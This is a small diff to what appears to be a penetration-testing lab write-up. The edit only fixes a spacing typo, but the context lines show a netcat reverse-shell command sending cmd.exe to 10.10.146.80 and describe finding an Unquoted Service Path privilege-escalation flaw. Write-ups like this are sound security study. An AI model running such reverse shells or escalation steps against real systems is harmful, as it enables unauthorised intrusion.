@@ -349,7 +349,7 @@ I uploaded a static netcat binary (https://github.com/int0x33/nc.exe/) to the se
 
 ` powershell.exe c:\\windows\\temp\\nc-USERNAME.exe 10.10.146.80 12345 -e cmd.exe `
 
-After gaining access and manually exploring the target, it became clear there was a potential Unquoted Service Path vulnerability in the ` SystemExplorerHelpService` service and I also had full read & write permissions to the directory:
+After gaining access and manually exploring the target, it became clear there was a potential Unquoted Service Path vulnerability in the `SystemExplorerHelpService` service and I also had full read & write permissions to the directory:
 ```
 C:\xampp\htdocs\resources\uploads>sc qc SystemExplorerHelpService
 sc qc SystemExplorerHelpService
